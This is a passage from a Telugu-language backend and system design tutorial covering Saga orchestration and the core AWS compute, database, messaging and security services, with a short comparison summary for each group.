- **Pros:** సింపుల్ గా ఉంటుంది, కొత్త సర్వీసెస్ ని ఈజీగా యాడ్ చేయవచ్చు. సింగిల్ పాయింట్ ఆఫ్ ఫెయిల్యూర్ (SPOF) ఉండదు.
- **Cons:** సర్వీసెస్ 15-20 దాటితే ఏ ఈవెంట్ ఎక్కడికి వెళ్తుందో ట్రాక్ చేయడం, హ్యాండిల్ చేయడం ఒక పెద్ద పీడకలగా మారుతుంది (**Spaghetti Architecture**).

### 🎻 Orchestration (మ్యూజిక్ బ్యాండ్ లాంటిది - Has a Conductor)

- **Concept:** ఒక ఆర్కెస్ట్రా (Orchestra) మ్యూజిక్ షోలో అందరి కంటే ముందు ఒక కండక్టర్ (చేతిలో కర్ర పట్టుకుని సైగలు చేసే వ్యక్తి) ఉండి ఎప్పుడు ఎవరు ఏ మ్యూజిక్ వాయించాలో చెప్తుంటాడు. ఇక్కడ కూడా ఒక సెంట్రల్ **Saga Orchestrator** (ఒక ప్రత్యేక సర్వీస్) ఉంటుంది.
- **How it works:** ఈ ఆర్కెస్ట్రేటరే ప్రతి సర్వీస్‌కి కమాండ్స్ పంపుతూ ప్రాసెస్ ని గైడ్ చేస్తుంది. ఇది **Sync లేదా Async** రెండింటి ద్వారా జరగవచ్చు.
- _ఫ్లో:_ ఆర్కెస్ట్రేటర్ మొదట `Payment Service` కి "డబ్బులు కట్ చెయ్" అని చెప్తుంది ──► అది సక్సెస్ అని చెప్పాక, `Inventory Service` కి "స్టాక్ తగ్గించు" అని చెప్తుంది. ఒకవేళ ఇన్వెంటరీ ఫెయిల్ అయితే, ఆర్కెస్ట్రేటరే స్వయంగా పేమెంట్ సర్వీస్ కి "డబ్బులు రీఫండ్ చెయ్ (Compensate)" అని ఆర్డర్ వేస్తుంది.

- **Pros:** బిజినెస్ లాజిక్, కరెంట్ ప్రాసెస్ స్టేట్ అంతా ఒకే చోట (Orchestrator లో) ఉంటుంది కాబట్టి కాంప్లెక్స్ సిస్టమ్స్ ని డీబగ్ చేయడం, కంట్రోల్ చేయడం చాలా ఈజీ.
- **Cons:** ఆ సెంట్రల్ ఆర్కెస్ట్రేటర్ సర్వీస్ డౌన్ అయితే మొత్తం బిజినెస్ ఫ్లో ఆగిపోతుంది (Single Point of Failure).

---

### 📌 సమ్మరీ (ఏది ఎప్పుడు వాడాలి?):

- సిస్టమ్ చిన్నగా ఉండి, సర్వీసెస్ మధ్య డిపెండెన్సీ తక్కువ ఉంటే **Choreography** బెస్ట్.
- సిస్టమ్ పెద్దదై, బిజినెస్ రూల్స్ కాంప్లెక్స్ గా ఉండి, ప్రతీ స్టెప్ ని ఖచ్చితంగా ట్రాక్ చేయాలి అనుకుంటే **Orchestration** బెస్ట్.

---

# 9: Cloud

సాఫ్ట్‌వేర్ ఇంజనీరింగ్‌లో మోడర్న్ బ్యాకెండ్ ఆర్కిటెక్చర్ అంతా క్లౌడ్ (Cloud) పైనే నడుస్తోంది. సొంతంగా సర్వర్లు కొని, డేటా సెంటర్లు మెయింటెనెన్స్ చేసే తలనొప్పి లేకుండా, కేవలం ఒక క్లిక్‌తో ప్రపంచవ్యాప్తంగా వందల సర్వర్లను అద్దెకు తీసుకోవడమే క్లౌడ్ కంప్యూటింగ్. ఇందులో కింగ్ అయిన **AWS (Amazon Web Services)** లోని కోర్ సర్వీసెస్‌ని మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Security & Networking (రక్షణ మరియు నెట్‌వర్క్ పునాది)

క్లౌడ్‌లో ఏదైనా బిల్డ్ చేయడానికి ముందు ఈ రెండు సర్వీసెస్ చాలా ముఖ్యం:

- **IAM (Identity and Access Management):** ఇది AWS లోపల తాళాలు మరియు పర్మిషన్స్ ఇచ్చే సెక్యూరిటీ గార్డ్. ఏ డెవలపర్‌కి లేదా ఏ సర్వీస్‌కి ఎంతవరకు యాక్సెస్ ఉండాలి అని డిసైడ్ చేస్తుంది. రూల్: ఎవరికైనా సరే వారికి కావలసిన కనీస పర్మిషన్స్ మాత్రమే ఇవ్వాలి (**Principle of Least Privilege**).
- **VPC (Virtual Private Cloud):** ఇది AWS లోపల మీ కంపెనీ కోసం క్రియేట్ చేసుకునే ఒక సొంత ప్రైవేట్ నెట్‌వర్క్ (డేటా సెంటర్). మీ డేటాబేస్‌లను బయటి ప్రపంచానికి కనిపించకుండా ప్రైవేట్ సబ్‌నెట్ (Private Subnet) లో దాచడానికి ఇది వాడతాం.

---

## 2. Compute (కంప్యూటింగ్—కోడ్ ఎక్కడ రన్ అవ్వాలి?)

మీ బ్యాకెండ్ కోడ్ ఎగ్జిక్యూట్ అవ్వడానికి AWS లో రకరకాల ఆప్షన్లు ఉన్నాయి:

### 🖥️ EC2 (Elastic Compute Cloud)

- **What it is:** క్లౌడ్‌లో మీకు ఇచ్చే ఒక వర్చువల్ కంప్యూటర్ (VM).
- **When to use:** ఓఎస్ (Ubuntu/Windows) లెవెల్ నుండి కంప్లీట్ కంట్రోల్ మీ చేతుల్లో ఉండాలి అనుకున్నప్పుడు ఇది వాడతాం. మీరే Nginx, Node.js ఇన్స్టాల్ చేసుకోవాలి, స్కేలింగ్ కూడా మీరే చూసుకోవాలి.

### 🐳 Containers: ECS & EKS

మీరు అప్లికేషన్‌ను డాకర్ (Docker) కంటైనర్లలో రన్ చేస్తుంటే ఇవి వాడాలి:

- **ECS (Elastic Container Service):** అమెజాన్ వాళ్ళ సొంత పవర్‌ఫుల్ మరియు సింపుల్ కంటైనర్ ఆర్కెస్ట్రేషన్ టూల్. మోనోలిత్ లేదా సింపుల్ మైక్రోసర్వీసెస్ కి ఇది బెస్ట్.
- **EKS (Elastic Kubernetes Service):** క్లౌడ్‌లో కుబెర్నెటిస్ (Kubernetes) క్లస్టర్‌ను రన్ చేయడానికి మేనేజ్డ్ సర్వీస్. వందల మైక్రోసర్వీసెస్ ఉన్న భారీ సిస్టమ్స్ కి ఇది వాడుతారు.

### ⚡ Lambda (Serverless King)

- **What it is:** ఇక్కడ సర్వర్లు, కంటైనర్లు ఏమీ ఉండవు. కేవలం మీ కోడ్ (Function) ని అప్‌లోడ్ చేస్తే చాలు. రిక్వెస్ట్ వచ్చినప్పుడు మాత్రమే ఇది ఆటోమేటిక్‌గా రన్ అయి, పని ముగియగానే క్లోజ్ అయిపోతుంది.
- **Why it's amazing:** **Pay-per-use!** మీ యాప్‌ని ఎవరూ వాడకపోతే ఒక్క రూపాయి కూడా బిల్లు పడదు. కోట్లాది రిక్వెస్ట్‌లు వచ్చినా క్షణాల్లో ఆటో-స్కేల్ అవుతుంది.

---

## 3. Edge & Routing (యూజర్‌ని సర్వర్‌కి కనెక్ట్ చేయడం)

- **Route53:** ఇది AWS వాళ్ళ గ్లోబల్ **DNS (Domain Name System)** సర్వీస్. యూజర్ `example.com` అని టైప్ చేయగానే, ఆ రిక్వెస్ట్‌ని మీ లోడ్ బాలెన్సర్‌కో లేదా EC2 సర్వర్‌కో అత్యంత వేగంగా మళ్లిస్తుంది.
- **API Gateway:** మనం మునుపటి చాప్టర్లలో చూసినట్లు, మైక్రోసర్వీసెస్ కి లేదా లాంబ్డా (Lambda) ఫంక్షన్లకి ముందు ఒక సెంట్రల్ ఎంట్రీ పాయింట్‌గా పనిచేస్తుంది.
- **CloudFront (CDN):** ఇది గ్లోబల్ **Content Delivery Network**. మీ వెబ్‌సైట్ ఇమేజ్‌లు, వీడియోలు లేదా ఫ్రంటెండ్ ఫైల్స్ (React/HTML) ప్రపంచవ్యాప్తంగా ఉన్న యూజర్లకి దగ్గరగా ఉండే లొకేషన్స్ (Edge Locations) లో క్యాషే (Cache) చేసి ఉంచుతుంది. సైట్ సూపర్ ఫాస్ట్‌గా ఓపెన్ అవుతుంది.

---

## 4. Storage & Management

### 🪣 S3 (Simple Storage Service)

- **What it is:** ఇది అపరిమితమైన స్టోరేజ్ కెపాసిటీ ఉన్న ఒక గ్లోబల్ లాకర్ (Object Storage).
- **When to use:** యూజర్లు అప్‌లోడ్ చేసే ప్రొఫైల్ పిక్చర్స్, పిడిఎఫ్ ఫైల్స్, వీడియోలు, లేదా డేటాబేస్ బ్యాకప్‌లను భద్రపరచడానికి ఇది వాడతాం. ఇది 99.999999999% (11 Nines) డేటా డ్యూరబిలిటీని ఇస్తుంది—అంటే డేటా అస్సలు మిస్ అవ్వదు.

### 👁️ Observability: CloudWatch & CloudTrail

- **CloudWatch:** మీ సర్వర్ల ఆరోగ్యాన్ని చూసే డాక్టర్. సర్వర్ CPU ఎంత వాడారు, రాసిన కోడ్‌లో ఏవైనా ఎర్రర్స్ (Logs) వచ్చాయా అని మానిటర్ చేయడానికి మరియు అలర్ట్స్ సెట్ చేయడానికి ఇది వాడతాం.
- **CloudTrail:** మీ AWS అకౌంట్ లోపల ఎవరు, ఏ టైమ్‌కి, ఏ సర్వర్‌ని డిలీట్ చేశారు లేదా ఏ మార్పులు చేశారు అని రికార్డ్ చేసే ఒక సెక్యూరిటీ కెమెరా (Audit Logs).

### ⚙️ AWS Systems Manager (SSM)

- **What it is:** వందలాది సర్వర్లను ఒకే చోట నుండి మేనేజ్ చేసే సెంట్రల్ టూల్. మీ సర్వర్ల లోపలికి లాగిన్ అవ్వకుండానే సాఫ్ట్‌వేర్ అప్‌డేట్స్ రన్ చేయడానికి, మరియు డేటాబేస్ పాస్‌వర్డ్‌లను సెక్యూర్ గా దాచడానికి (**Parameter Store**) ఇది వాడుతాం.

---

AWS లోపల డేటాని ఎలా స్టోర్ చేయాలి, వేగంగా ఎలా యాక్సెస్ చేయాలి అని చెప్పే మోస్ట్ పవర్‌ఫుల్ అండ్ మేనేజ్డ్ **Cloud Database Services** ఇవి. మనం నార్మల్ గా వాడే MySQL, PostgreSQL లేదా Redis లని సొంతంగా EC2 సర్వర్లలో ఇన్స్టాల్ చేసుకునే అవసరం లేకుండా, బ్యాకప్స్ మరియు స్కేలింగ్ బాధ్యతలన్నీ AWS చూసుకునేలా డిజైన్ చేయబడిన సర్వీసెస్ ఇవి.

వీటిని కూడా మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. RDS (Relational Database Service - సాంప్రదాయ రాజు)

- **What it is:** ఇది AWS అందించే కంప్లీట్లీ మేనేజ్డ్ రిలేషనల్ (SQL) డేటాబేస్ సర్వీస్. ఇందులో మీరు MySQL, PostgreSQL, MariaDB, Oracle, లేదా SQL Server లని ఒక క్లిక్‌తో సెటప్ చేసుకోవచ్చు.
- **Why it's an upgrade:** మీరు సొంతంగా డేటాబేస్ ఇన్స్టాల్ చేస్తే బ్యాకప్స్ తీసుకోవడం, ఓఎస్ అప్‌డేట్ చేయడం, డేటాబేస్ క్రాష్ అయితే రికవర్ చేయడం మీరే చూసుకోవాలి. కానీ RDS లో:
- **Automated Backups:** రోజూ ఆటోమేటిక్‌గా బ్యాకప్స్ జరిగిపోతాయి.
- **Multi-AZ Deployment:** డేటాబేస్‌ని రెండు వేర్వేరు డేటా సెంటర్లలో (Availability Zones) క్లోన్ చేసి ఉంచుతుంది. ఒక డేటా సెంటర్ తగలబడిపోయినా, రెండో దాని నుండి సిస్టమ్ వెంటనే రన్ అవుతుంది (**High Availability**).
- **Read Replicas:** చదివే లోడ్ (Read Traffic) ఎక్కువైతే, కేవలం రీడ్ కోసం మాత్రమే ఉపయోగపడే మల్టిపుల్ కాపీలను క్రియేట్ చేసుకోవచ్చు.

---

## 2. Amazon Aurora (The Enterprise Beast)

- **What it is:** ఇది AWS స్వయంగా క్లౌడ్ కోసం ప్రత్యేకంగా రీ-ఇంజనీరింగ్ (Re-engineered) చేసిన ఒక నెక్స్ట్-లెవెల్ రిలేషనల్ డేటాబేస్. ఇది MySQL మరియు PostgreSQL కి 100% సపోర్ట్ ఇస్తుంది.
- **Why it's a massive upgrade over normal RDS:**
- **Speed:** మామూలు MySQL కంటే 5 రెట్లు, Postgres కంటే 3 రెట్లు ఎక్కువ స్పీడ్ ఉంటుంది.
- **Cloud-Native Storage:** మీ డేటాని ఆటోమేటిక్‌గా 3 వేర్వేరు డేటా సెంటర్లలో 6 కాపీలుగా విడగొట్టి భద్రపరుస్తుంది. ఒకవేళ స్టోరేజ్ పెరిగేకొద్దీ ఇది ఆటోమేటిక్‌గా 128TB వరకు స్కేల్ అవుతుంది, మనం మ్యాన్యువల్ గా సైజ్ పెంచక్కర్లేదు.
- **Serverless Option (Aurora Serverless v2):** ట్రాఫిక్ లేనప్పుడు డేటాబేస్ కెపాసిటీ తగ్గిపోతుంది, ట్రాఫిక్ పెరిగినప్పుడు మిల్లీసెకన్లలో పెరిగిపోతుంది. దీనివల్ల బిల్లింగ్ చాలా ఆదా అవుతుంది.

---

## 3. Amazon DynamoDB (The NoSQL King)

- **What it is:** ఇది అమెజాన్ వాళ్ళ సొంత, కంప్లీట్లీ మేనేజ్డ్ **Key-Value & Document NoSQL Database**.
- **Why it's legendary:** దీని స్పెషాలిటీ ఏంటంటే, మీ డేటాబేస్ సైజ్ 10 GB ఉన్నా లేదా 100 TB ఉన్నా సరే, రెస్పాన్స్ టైమ్ ఎప్పుడూ **Single-digit millisecond (కచ్చితంగా 10ms లోపే)** ఉంటుంది.
- **Features:**
- **Serverless:** దీనికి సర్వర్లు, సీపీయూలు అంటూ ఏమీ ఉండవు. కేవలం మనకు ఎంత స్పీడ్ కావాలి (Read/Write Capacity) అని చెప్తే చాలు.
- **Global Tables:** మీ యాప్ ప్రపంచవ్యాప్తంగా రన్ అవుతుంటే, ఒకే ఒక్క క్లిక్‌తో అమెరికా, ఇండియా, యూరప్ డేటా సెంటర్లలో డేటాని రియల్-టైమ్‌లో సింక్ చేస్తుంది (Active-Active Replication).
- _ఎప్పుడు వాడాలి:_ షాపింగ్ కార్ట్ డేటా, యూజర్ సెషన్స్, లీడర్‌బోర్డ్స్, మరియు విపరీతమైన ట్రాఫిక్ వచ్చే రైడ్-షేరింగ్ (Uber లాంటి) యాప్స్ కి ఇది పర్ఫెక్ట్.

---

## 4. Amazon ElastiCache (The Speed Booster)

- **What it is:** మనం క్యాషింగ్ (Caching) చాప్టర్‌లో నేర్చుకున్న **Redis** మరియు **Memcached** లని క్లౌడ్‌లో మేనేజ్డ్ సర్వీస్ లాగా అందించడమే **ElastiCache**.
- **Role:** డేటాబేస్ (RDS/DynamoDB) పై లోడ్ తగ్గించడానికి, తరచూ వాడే డేటాని అత్యంత వేగవంతమైన RAM (In-Memory) లో దాచడానికి ఇది వాడతాం.
- **Why it's used:** డేటాబేస్ నుండి డేటా తెచ్చుకోవడానికి 20ms పడితే, ఎలస్టిక్యాషే నుండి మైక్రోసెకన్లలో (`Microseconds`) డేటా వచ్చేస్తుంది. సెకనుకి లక్షలాది రిక్వెస్ట్‌లను చాలా ఈజీగా తట్టుకోగలదు.

---

### 📌 క్విక్ సమ్మరీ (ఏది ఎప్పుడు వాడాలి?):

- పక్కా రిలేషన్స్, జాయిన్స్ (Joins), మరియు ACID ట్రాన్సాక్షన్స్ కావాలి, బడ్జెట్ నార్మల్ గా ఉందంటే ──► **AWS RDS**
- భారీ ఎంటర్‌ప్రైజ్ యాప్, విపరీతమైన స్కేలింగ్ మరియు అల్టిమేట్ స్పీడ్ కావాలంటే ──► **Amazon Aurora**
- జాయిన్స్ అవసరం లేదు, మిలియన్ల యూజర్లు ఉన్నారు, 1ms స్పీడ్ లో స్కేల్ అవ్వాలి అనుకుంటే ──► **Amazon DynamoDB**
- అసలు డేటాబేస్ వరకు రిక్వెస్ట్ వెళ్ళకుండా రాకెట్ స్పీడ్ క్యాషింగ్ కావాలంటే ──► **Amazon ElastiCache**

---

AWS లోపల మైక్రోసర్వీసెస్ ఒకదానితో ఒకటి అసింక్రోనస్‌గా (Asynchronously), లూజ్లీ-కపుల్డ్ (Loosely Coupled) గా మాట్లాడుకోవడానికి వాడే మోస్ట్ పవర్‌ఫుల్ **Cloud Messaging & Eventing Services** ఇవి. మనం మునుపటి మెసేజింగ్ సిస్టమ్స్ చాప్టర్‌లో నేర్చుకున్న క్యూలు, పబ్/సబ్ మరియు కాఫ్కా కాన్సెప్ట్స్‌ని AWS క్లౌడ్‌లో ఎలా ఇంప్లిమెంట్ చేయాలో ఇవి వివరిస్తాయి.

వీటిని కూడా మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Amazon SQS (Simple Queue Service - నమ్మకమైన క్యూ)

- **What it is:** ఇది AWS అందించే కంప్లీట్లీ మేనేజ్డ్ **Message Queue**. ఇది 1-to-1 కమ్యూనికేషన్ పద్ధతిలో పనిచేస్తుంది.
- **How it works:** ఒక ప్రొడ్యూసర్ సర్వీస్ మెసేజ్‌ని క్యూలో వేస్తుంది. ఒక కన్స్యూమర్ వర్కర్ (ఉదాహరణకు ఒక EC2 సర్వర్ లేదా Lambda ఫంక్షన్) ఆ క్యూ నుండి మెసేజ్‌ని పుల్ (Pull) చేసి ప్రాసెస్ చేస్తుంది. మెసేజ్ ప్రాసెస్ అవ్వగానే క్యూ నుండి డిలీట్ అయిపోతుంది.
- **Types of Queues:**

1. **Standard Queue:** ఇది అపరిమితమైన స్పీడ్ (Unlimited Throughput) ని ఇస్తుంది. కానీ మెసేజ్ ల ఆర్డర్ మిస్ అవ్వచ్చు (Best-effort ordering) మరియు కొన్నిసార్లు ఒకే మెసేజ్ రెండు సార్లు వచ్చే ఛాన్స్ ఉంది (At-least-once delivery).
2. **FIFO Queue (First-In-First-Out):** మెసేజ్‌లు ఏ ఆర్డర్‌లో వచ్చాయో, అదే ఆర్డర్‌లో ఖచ్చితంగా ఒకే ఒక్కసారి ప్రాసెస్ అవుతాయి (**Exactly-Once Processing**). కానీ దీని స్పీడ్ లిమిటెడ్ గా ఉంటుంది.

- _ఉదాహరణ:_ వీడియో అప్‌లోడ్ యాప్‌లో, యూజర్ వీడియో అప్‌లోడ్ చేయగానే ఆ టాస్క్‌ని SQS లో వేస్తాం. బ్యాక్‌గ్రౌండ్ వర్కర్ నిమ్మదిగా దాన్ని కంప్రెస్ చేస్తుంది.

---

## 2. Amazon SNS (Simple Notification Service - పబ్లిక్ అనౌన్స్‌మెంట్)

- **What it is:** ఇది ఒక కంప్లీట్లీ మేనేజ్డ్ **Pub/Sub (Publish/Subscribe)** లేదా టాపిక్-బేస్డ్ సర్వీస్. ఇది 1-to-Many (Fan-out) కమ్యూనికేషన్ పద్ధతిలో పనిచేస్తుంది.
- **How it works:** ఒక ఈవెంట్ జరగగానే ప్రొడ్యూసర్ ఆ సమాచారాన్ని SNS Topic కి పంపుతాడు. ఆ టాపిక్‌కి సబ్‌స్క్రైబ్ చేసుకున్న అందరికీ (మల్టిపుల్ SQS క్యూలు, ఈమెయిల్స్, మొబైల్ SMS, లేదా Lambda ఫంక్షన్స్) ఆ మెసేజ్ ఒకేసారి పుష్ (Push) చేయబడుతుంది.
- _ఉదాహరణ:_ ఈ-కామర్స్ సైట్‌లో `Order-Placed` అనే ఒక SNS టాపిక్ ఉంటుంది. ఆర్డర్ అవ్వగానే ఆ మెసేజ్ SNS కి వెళ్తుంది. అక్కడ నుండి:
- `Email Service` కి ఒక కాపీ వెళ్తుంది (యూజర్‌కి మెయిల్ పంపడానికి).
- `Shipping SQS Queue` కి ఇంకో కాపీ వెళ్తుంది (ప్యాకింగ్ స్టార్ట్ చేయడానికి).
- `Analytics Lambda` కి మరో కాపీ వెళ్తుంది (డేటా అనాలిసిస్ కోసం).

---

## 3. Amazon EventBridge (The Serverless Event Bus - మోడర్న్ రూటర్)

- **What it is:** ఇది AWS డిజైన్ చేసిన నెక్స్ట్-generation **Serverless Event Bus**. ఇది ఒక రకంగా SNS లాంటిదే, కానీ చాలా స్మార్ట్ మరియు పవర్‌ఫుల్ అప్‌గ్రేడ్.
- **Why it's a massive upgrade:**
- **Advanced Filtering:** SNS లో మెసేజ్‌ని బ్లైండ్‌గా పంపేస్తాం. కానీ ఈవెంట్‌బ్రిడ్జ్‌లో "ఒకవేళ ఆర్డర్ వాల్యూ > ₹10,000 ఐతేనే ఈ సర్వీస్‌కి పంపు" లాంటి కాంప్లెక్స్ రూల్స్ (JSON Rules) రాయవచ్చు.
- **SaaS Integration:** కేవలం AWS సర్వీసెస్ మాత్రమే కాదు, థర్డ్-పార్టీ సాఫ్ట్‌వేర్లు అయిన **Stripe**, **Zendesk**, **PagerDuty** ల నుండి వచ్చే ఈవెంట్లను కూడా నేరుగా రిసీవ్ చేసుకుని మన బ్యాకెండ్‌కి రూట్ చేయగలదు.
- **Schema Registry:** వచ్చే ఈవెంట్ JSON ఫార్మాట్ ఏంటి అనేది ఇది పక్కాగా ట్రాక్ చేస్తుంది, తద్వారా డెవలపర్లకి కోడింగ్ ఈజీ అవుతుంది.

---

## 4. Amazon MSK (Managed Streaming for Apache Kafka - ది ఈవెంట్ కింగ్)

- **What it is:** మనం ఈవెంట్ స్ట్రీమింగ్ చాప్టర్‌లో నేర్చుకున్న అత్యంత పవర్‌ఫుల్ మరియు ఫాస్టెస్ట్ టూల్ అయిన **Apache Kafka** ని AWS లో మేనేజ్డ్ సర్వీస్ లాగా అందించడమే **Amazon MSK**.
- **Why we use it:** కాఫ్కాని సొంతంగా సెటప్ చేయడం, క్లస్టర్ మేనేజ్ చేయడం, జూకీపర్/క్రాఫ్ట్ మెయింటైన్ చేయడం చాలా కష్టమైన పని. MSK లో ఆ తలనొప్పి లేకుండా కొన్ని క్లిక్స్‌తో ప్రొడక్షన్-రెడీ కాఫ్కా క్లస్టర్‌ని పొందవచ్చు.
- **When to use:** సెకనుకి లక్షలాది లేదా కోట్లాది లైవ్ ఈవెంట్స్ వస్తున్నప్పుడు (ఉదాహరణకు: లైవ్ లొకేషన్ ట్రాకింగ్, క్లిక్‌స్ట్రీమ్ అనలిటిక్స్, లేదా భారీ మైక్రోసర్వీసెస్ ఈవెంట్ సోర్సింగ్), SQS/SNS తట్టుకోలేవు. అప్పుడు కేవలం **MSK (Kafka)** మాత్రమే రక్షించగలదు.

---

### 📌 క్విక్ సమ్మరీ (ఏది ఎప్పుడు వాడాలి?):

- 1-to-1 వర్కర్ మోడల్, బ్యాక్‌గ్రౌండ్ లో పనులు నిమ్మదిగా జరగాలి ──► **Amazon SQS**
- 1-to-Many మోడల్, ఒకే మెసేజ్ ని మల్టిపుల్ సిస్టమ్స్ కి వెంటనే పుష్ చేయాలి ──► **Amazon SNS**
- మైక్రోసర్వీసెస్ మధ్య ఈవెంట్-డ్రివెన్ ఆర్కిటెక్చర్ బిల్డ్ చేయాలి, రూటింగ్ రూల్స్ రాసుకోవాలి ──► **Amazon EventBridge**
- మిలియన్ల కొద్దీ రియల్-టైమ్ డేటా స్ట్రీమ్స్, లాగ్స్, మరియు ఆర్డర్ రీప్లే (Replay) ఆప్షన్ కావాలి ──► **Amazon MSK (Kafka)**

---

క్లౌడ్ ఆర్కిటెక్చర్‌లో మరియు సిస్టమ్ డిజైన్‌లో **Security** అనేది అందరికంటే ముందే ఉండాల్సిన అతి ముఖ్యమైన లేయర్. మీ బ్యాకెండ్ ఎంత ఫాస్ట్‌గా ఉన్నా, సరైన ప్రొటెక్షన్ లేకపోతే హ్యాకర్లు డేటాని దొంగిలించడం లేదా సర్వర్‌ని క్రాష్ చేయడం (DDoS) క్షణాల్లో జరిగిపోతుంది.

AWS లో మీ అప్లికేషన్‌ను హ్యాకర్ల నుండి, బాట్ల (Bots) నుండి మరియు డేటా లీకుల నుండి కాపాడే మోస్ట్ పవర్‌ఫుల్ **Cloud Security Services** ని మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Network Layer Security (వెలుపలి దాడుల నుండి రక్షణ)

యూజర్ రిクエスト మన API గేట్‌వే లేదా లోడ్ బాలెన్సర్ దగ్గరికి వచ్చే ముందే ఈ రెండు సర్వీసెస్ రక్షణ వలయంలా నిలబడతాయి:

### 🛡️ AWS WAF (Web Application Firewall - స్మార్ట్ సెక్యూరిటీ గార్డ్)

- **What it is:** ఇది Layer 7 (Application Layer) లో పనిచేసే ఫైర్‌వాల్.
- **Role:** ఇది వచ్చే ప్రతి HTTP రిクエストను స్కాన్ చేస్తుంది. హ్యాకర్లు సర్వర్‌ని హ్యాక్ చేయడానికి ట్రై చేసే మోస్ట్ కామన్ అటాక్స్ అయిన **SQL Injection** (డేటాబేస్ ని దొంగిలించడం) లేదా **Cross-Site Scripting (XSS)** లాంటి వాటిని ఇది అప్లికేషన్ వరకు వెళ్ళకుండా ముందే బ్లాక్ చేస్తుంది.
- **Features:** మీరు ఇందులో రూల్స్ రాసుకోవచ్చు. (ఉదాహరణకు: "చైనా లేదా రష్యా ఐపీల నుండి వచ్చే రిクエストలను బ్లాక్ చేయి" లేదా "ఒకే ఐపీ నుండి నిమిషానికి 100 కంటే ఎక్కువ రిクエストలు వస్తే ఆటోమేటిక్‌గా రేట్ లిమిట్ చేయి").

### 🛡️ AWS Shield (DDoS ప్రొటెక్షన్ కింగ్)

- **What it is:** ఇది క్లస్టర్లపై జరిగే భారీ **DDoS (Distributed Denial of Service)** దాడుల నుండి కాపాడే ఒక అల్టిమేట్ డిఫెన్స్ సిస్టమ్. (DDoS అంటే లక్షలాది నకిలీ కంప్యూటర్ల నుండి ఒకేసారి మన సైట్‌పై ట్రాఫిక్ పంపి సర్వర్‌ని క్రాష్ చేయడం).
- **Types:** 1. **Shield Standard:** ఇది AWS వాడుతున్న ప్రతి ఒక్కరికీ ఉచితంగా, ఆటోమేటిక్‌గా బ్యాక్‌గ్రౌండ్‌లో రన్ అవుతూ Layer 3/4 దాడులను బ్లాక్ చేస్తుంది.

2. **Shield Advanced:** ఇది పెద్ద ఎంటర్‌ప్రైజ్ కంపెనీల కోసం వాడుతారు. ఒకవేళ భారీ అటాక్ జరిగితే, AWS వాళ్ళ సొంత 24/7 DDoS రెస్పాన్స్ టీమ్ (DRT) రంగంలోకి దిగి మన అప్లికేషన్‌ను కాపాడుతుంది.

---

## 2. Data & Secret Management (డేటా మరియు రహస్యాల భద్రత)

డేటాబేస్ లోని డేటాని ఎలా దాచాలి, కోడ్‌లో వాడే పాస్‌వర్డ్‌లను ఎలా మేనేజ్ చేయాలి అని చెప్పే సర్వీసెస్ ఇవి:

### 🔑 AWS KMS (Key Management Service - తాళాల గది)

- **What it is:** ఇది క్లౌడ్‌లో మీ డేటాని ఎన్‌క్రిప్ట్ (Encrypt—అంటే ఎవరికీ అర్థం కాని కోడ్ లాగా మార్చడం) చేయడానికి వాడే ఒక కంప్లీట్లీ మేనేజ్డ్ **Encryption Keys (CMKs)** సర్వీస్.
- **How it helps:** S3 బకెట్‌లో ఉన్న ఫైల్స్, RDS డేటాబేస్ లోని డేటా లేదా EBS డిస్క్ లోని డేటాని హ్యాకర్లు దొంగిలించినా, అది ఓపెన్ అవ్వకుండా ఉండటానికి KMS కీస్ తో ఎన్‌క్రిప్ట్ చేసి ఉంచుతాం.
- **Security:** ఈ కీలను AWS లోపల అత్యంత సురక్షితమైన **HSM (Hardware Security Modules)** లో భద్రపరుస్తారు. క్లౌడ్ అడ్మిన్ కూడా ఆ తాళాన్ని నేరుగా చూడలేడు.

### 🤫 AWS Secrets Manager (రహస్యాల మేనేజర్)

- **The Problem:** చాలా మంది డెవలపర్లు చేసే తప్పు ఏంటంటే—డేటాబేస్ పాస్‌వర్డ్, గిట్‌హబ్ టోకెన్స్ లేదా థర్డ్-పార్టీ API కీలను నేరుగా కోడ్ లోనో లేదా `.env` ఫైల్స్ లోనో రాసి Git లో పుష్ చేస్తారు. ఇది చాలా డేంజర్.
- **The Solution (Secrets Manager):** మీ రహస్యాలన్నింటినీ (Passwords/API Keys) తీసుకెళ్ళి ఈ సర్వీస్ లోపల దాచాలి. మీ బ్యాకెండ్ కోడ్ రన్ అవుతున్నప్పుడు అది AWS SDK ద్వారా Secrets Manager ని కాల్ చేసి ఆ పాస్‌వర్డ్‌ని మెమరీలోకి తెచ్చుకుంటుంది.

```text
  [ Backend Code ] ──( Get DB Password )──► [ AWS Secrets Manager ]
         │                                            │
         │ (Received Password)                        │ (Auto-rotates password
         ▼                                            ▼  every 30 days)
  [ Connects to RDS DB ]                        [ Updates RDS DB ]

```

- **The Ultimate Feature - Secret Rotation:** దీని స్పెషాలిటీ ఏంటంటే, ఇది ప్రతి 30 రోజులకు ఒకసారి మీ డేటాబేస్ పాస్‌వర్డ్‌ని ఆటోమేటిక్‌గా మార్చేయగలదు (**Rotate** చేయగలదు). పాత పాస్‌వర్డ్ లీక్ అయినా సరే, అది ఆల్రెడీ మారిపోతుంది కాబట్టి సిస్టమ్ 100% సేఫ్.

---

### 📌 క్విక్ సమ్మరీ (ఏది ఎందుకు?):

- వెబ్‌సైట్ హ్యాకింగ్ అటాక్స్ (SQL Injection) మరియు బాట్ ట్రాఫిక్ ని కంట్రోల్ చేయడానికి ──► **AWS WAF**
- భారీ DDoS దాడుల నుండి వెబ్‌సైట్ డౌన్ అవ్వకుండా కాపాడటానికి ──► **AWS Shield**
- డేటాబేస్ లు మరియు ఫైల్స్ ని లాక్ చేయడానికి (Encryption) ──► **AWS KMS**
- డేటాబేస్ పాస్‌వర్డ్‌లు, API కీలను దాచడానికి మరియు ఆటో-రొటేట్ చేయడానికి ──► **AWS Secrets Manager**

---

సిస్టమ్ డిజైన్ మరియు క్లౌడ్ ఆర్కిటెక్చర్‌లో అప్లికేషన్‌ను బిల్డ్ చేయడం ఒకెత్తయితే, అది ప్రొడక్షన్‌లోకి వెళ్లాక ఎలా పనిచేస్తోంది, ఎక్కడైనా స్లో అవుతుందా, లేదా ఎర్రర్స్ వస్తున్నాయా అని నిరంతరం గమనించడం ఇంకొకెత్తు. దీనినే **Observability & Monitoring** అంటారు.

